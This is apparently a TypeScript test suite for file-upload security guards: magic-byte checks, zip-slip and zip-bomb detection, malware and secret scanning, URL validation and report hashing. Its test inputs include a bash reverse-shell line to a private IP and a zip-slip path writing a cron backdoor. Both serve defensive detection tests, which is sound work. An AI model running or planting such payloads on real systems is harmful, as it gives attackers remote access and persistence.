import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  verifyMagicBytes,
  inspectArchive,
  countPdfPages,
  MockSignatureScanner,
  EICAR_TEST_SIGNATURE,
  scanTextForSecrets,
  checkDependencies,
  checkLiveUrl,
  checkRepoUrl,
  evaluateFaithfulness,
  buildFaithfulnessReport,
} from "../src/lib/guards";
import zlib from "zlib";

describe("Guards — Magic Bytes & MIME Sniffing", () => {
  it("accepts authentic PDF buffer with %PDF- header", () => {
    const pdfBuf = Buffer.from("%PDF-1.4\n%âãÏÓ\n1 0 obj\n<< /Type /Catalog >>\nendobj\ntrailer\n<< >>\n%%EOF");
    const res = verifyMagicBytes("proposal.pdf", pdfBuf);
    assert.equal(res.valid, true);
    assert.equal(res.detectedMime, "application/pdf");
  });

  it("rejects an executable spoofed with a .pdf extension", () => {
    const fakePdfBuf = Buffer.from("MZ\x90\x00\x03\x00\x00\x00"); // DOS/Windows executable header
    const res = verifyMagicBytes("malicious.pdf", fakePdfBuf);
    assert.equal(res.valid, false);
    assert.match(res.error || "", /Unsupported file format/);
  });

  it("accepts valid PNG magic bytes", () => {
    const pngBuf = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
    const res = verifyMagicBytes("logo.png", pngBuf);
    assert.equal(res.valid, true);
    assert.equal(res.detectedMime, "image/png");
  });

  it("accepts valid JPEG magic bytes", () => {
    const jpgBuf = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46]);
    const res = verifyMagicBytes("photo.jpg", jpgBuf);
    assert.equal(res.valid, true);
    assert.equal(res.detectedMime, "image/jpeg");
  });

  it("accepts PK ZIP header for .zip and Office OOXML (.xlsx, .pptx)", () => {
    const zipBuf = Buffer.from([0x50, 0x4b, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00]);
    const resZip = verifyMagicBytes("code.zip", zipBuf);
    assert.equal(resZip.valid, true);

    const resXlsx = verifyMagicBytes("budget.xlsx", zipBuf);
    assert.equal(resXlsx.valid, true);
    assert.equal(resXlsx.detectedMime, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet");
  });

  it("rejects plain text or binary files masquerading as CSV if containing null bytes", () => {
    const badCsv = Buffer.from("header1,header2\nvalue1,\x00\x00badbinary");
    const res = verifyMagicBytes("data.csv", badCsv);
    assert.equal(res.valid, false);
  });
});

describe("Guards — Archive Safety & Zip-Slip Protection", () => {
  function makeSimpleZip(fileName: string, content: Buffer): Buffer {
    const fileBytes = content;
    const nameBytes = Buffer.from(fileName, "utf8");

    const header = Buffer.alloc(30);
    header.writeUInt32LE(0x04034b50, 0); // signature
    header.writeUInt16LE(20, 4); // version needed
    header.writeUInt16LE(0, 6); // flags
    header.writeUInt16LE(0, 8); // compression method (stored)
    header.writeUInt16LE(0, 10); // mod time
    header.writeUInt16LE(0, 12); // mod date
    header.writeUInt32LE(0, 14); // crc32
    header.writeUInt32LE(fileBytes.length, 18); // compressed size
    header.writeUInt32LE(fileBytes.length, 22); // uncompressed size
    header.writeUInt16LE(nameBytes.length, 26); // name length
    header.writeUInt16LE(0, 28); // extra length

    return Buffer.concat([header, nameBytes, fileBytes]);
  }

  it("passes clean zip archives", () => {
    const zip = makeSimpleZip("src/index.ts", Buffer.from("console.log('hello');"));
    const inspection = inspectArchive(zip);
    assert.equal(inspection.valid, true);
    assert.equal(inspection.totalFiles, 1);
    assert.equal(inspection.hasZipSlip, false);
  });

  it("detects and rejects zip-slip path traversal attacks (../evil.sh)", () => {
    const zipSlip = makeSimpleZip("../../etc/cron.d/backdoor", Buffer.from("* * * * * root reboot"));
    const inspection = inspectArchive(zipSlip);
    assert.equal(inspection.valid, false);
    assert.equal(inspection.hasZipSlip, true);
    assert.match(inspection.error || "", /path traversal patterns/);
  });

  it("detects abnormal compression ratios (potential zip bombs)", () => {
    // Fabricate a header advertising a huge uncompressed size with tiny compressed size
    const fakeBomb = Buffer.alloc(30 + 8 + 10);
    fakeBomb.writeUInt32LE(0x04034b50, 0);
    fakeBomb.writeUInt16LE(8, 8); // deflated
    fakeBomb.writeUInt32LE(10, 18); // 10 compressed bytes
    fakeBomb.writeUInt32LE(1000000, 22); // 1MB uncompressed size (ratio: 100,000x)
    fakeBomb.writeUInt16LE(8, 26);
    fakeBomb.write("bomb.txt", 30);

    const inspection = inspectArchive(fakeBomb, { maxRatio: 50 });
    assert.equal(inspection.valid, false);
    assert.match(inspection.error || "", /compression ratio/);
  });
});

describe("Guards — PDF Page Count", () => {
  it("accurately counts pages in PDF trailers and objects", () => {
    const pdfContent = `%PDF-1.4
1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj
2 0 obj << /Type /Pages /Count 5 /Kids [3 0 R] >> endobj
trailer << /Root 1 0 R >> %%EOF`;
    const result = countPdfPages(Buffer.from(pdfContent), 10);
    assert.equal(result.valid, true);
    assert.equal(result.pageCount, 5);
  });

  it("rejects proposals exceeding max page limit", () => {
    const pdfContent = `%PDF-1.4
1 0 obj << /Type /Pages /Count 15 >> endobj
trailer << >> %%EOF`;
    const result = countPdfPages(Buffer.from(pdfContent), 10);
    assert.equal(result.valid, false);
    assert.equal(result.pageCount, 15);
    assert.match(result.error || "", /exceeding the maximum allowed limit/);
  });
});

describe("Guards — Malware & EICAR Scanner", () => {
  const scanner = new MockSignatureScanner();

  it("detects the standardized EICAR test signature", async () => {
    const eicarBuf = Buffer.from(EICAR_TEST_SIGNATURE);
    const res = await scanner.scan(eicarBuf, "test-file.com");
    assert.equal(res.clean, false);
    assert.equal(res.signature, "EICAR-Test-Signature");
  });

  it("flags reverse shell patterns in submitted scripts", async () => {
    const shellScript = Buffer.from("#!/bin/bash\n/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1");
    const res = await scanner.scan(shellScript, "install.sh");
    assert.equal(res.clean, false);
    assert.equal(res.signature, "Suspicious-Shellcode-Pattern");
  });

  it("passes safe code files", async () => {
    const safeCode = Buffer.from("export function add(a: number, b: number) { return a + b; }");
    const res = await scanner.scan(safeCode, "math.ts");
    assert.equal(res.clean, true);
  });
});

describe("Guards — Secret & Credential Scanning", () => {
  it("detects exposed AWS access keys and masks them in report", () => {
    const code = 'const s3 = new AWS.S3({ accessKeyId: "AKIAIOSFODNN7EXAMPLE" });';
    const scan = scanTextForSecrets(code, "config.ts");
    assert.equal(scan.passed, false);
    assert.equal(scan.findings.length, 1);
    assert.equal(scan.findings[0].type, "AWS Access Key");
    assert.equal(scan.findings[0].snippet, "AKIA****************");
  });

  it("detects unencrypted RSA private keys", () => {
    const pem = `-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0Y1W...
-----END RSA PRIVATE KEY-----`;
    const scan = scanTextForSecrets(pem, "server.key");
    assert.equal(scan.passed, false);
    assert.equal(scan.findings[0].type, "Asymmetric Private Key");
  });

  it("passes clean code without credentials", () => {
    const code = "const apiKey = process.env.DATABASE_KEY;";
    const scan = scanTextForSecrets(code, "db.ts");
    assert.equal(scan.passed, true);
    assert.equal(scan.findings.length, 0);
  });
});

describe("Guards — Link & Reachability Validation", () => {
  it("rejects non-HTTPS live URLs", async () => {
    const res = await checkLiveUrl("http://unencrypted-portal.co.bw");
    assert.equal(res.valid, false);
    assert.match(res.error || "", /must use HTTPS/);
  });

  it("rejects private/localhost live URLs", async () => {
    const res = await checkLiveUrl("https://localhost:3000");
    assert.equal(res.valid, false);
    assert.match(res.error || "", /cannot point to internal\/local address/);
  });

  it("validates approved repo hosts (GitHub, GitLab, Bitbucket)", async () => {
    const good = await checkRepoUrl("https://github.com/luxraye/regulator");
    assert.equal(good.valid, true);

    const unknown = await checkRepoUrl("https://unknown-host.com/project");
    assert.equal(unknown.valid, false);
    assert.match(unknown.error || "", /GitHub, GitLab, or Bitbucket/);
  });
});

describe("Guards — Faithfulness & Sealed Report Generation", () => {
  it("evaluates questionnaire completeness and accepts N/A answers", () => {
    const outcomes = evaluateFaithfulness({
      eligibilityRules: [{ field: "age", op: "gte", value: 18 }],
      candidateData: { age: 24 },
      formFields: [
        { key: "q1", label: "Question 1", type: "text", required: true },
        { key: "q2", label: "Question 2", type: "text", required: true, naAllowed: true },
      ],
      submittedFields: { q1: "Working solution", q2: "N/A" },
      affiliationsDeclared: true,
      dpaConsentRecorded: true,
    });

    const qCheck = outcomes.find((o) => o.checkKey === "all_questions_answered_or_na");
    assert.equal(qCheck?.status, "PASS");
  });

  it("fails questionnaire completeness when required questions are omitted", () => {
    const outcomes = evaluateFaithfulness({
      eligibilityRules: [],
      candidateData: {},
      formFields: [
        { key: "q1", label: "Project Summary", type: "textarea", required: true },
        { key: "q2", label: "Target Market", type: "textarea", required: true },
      ],
      submittedFields: { q1: "Summary present" },
      affiliationsDeclared: true,
      dpaConsentRecorded: true,
    });

    const qCheck = outcomes.find((o) => o.checkKey === "all_questions_answered_or_na");
    assert.equal(qCheck?.status, "FAIL");
    assert.match(qCheck?.detail || "", /Target Market/);
  });

  it("builds reproducible, deterministic faithfulness report with SHA-256 fingerprint", () => {
    const report1 = buildFaithfulnessReport("ent-123", "CEDA-26-001", [
      { checkKey: "b_check", name: "B Check", category: "file", status: "PASS", detail: "OK" },
      { checkKey: "a_check", name: "A Check", category: "security", status: "PASS", detail: "OK" },
    ]);

    const report2 = buildFaithfulnessReport("ent-123", "CEDA-26-001", [
      { checkKey: "a_check", name: "A Check", category: "security", status: "PASS", detail: "OK" },
      { checkKey: "b_check", name: "B Check", category: "file", status: "PASS", detail: "OK" },
    ]);

    assert.equal(report1.faithfulnessHash, report2.faithfulnessHash);
    assert.equal(report1.hardFailBlocked, false);
    assert.equal(report1.totalChecks, 2);
  });
});
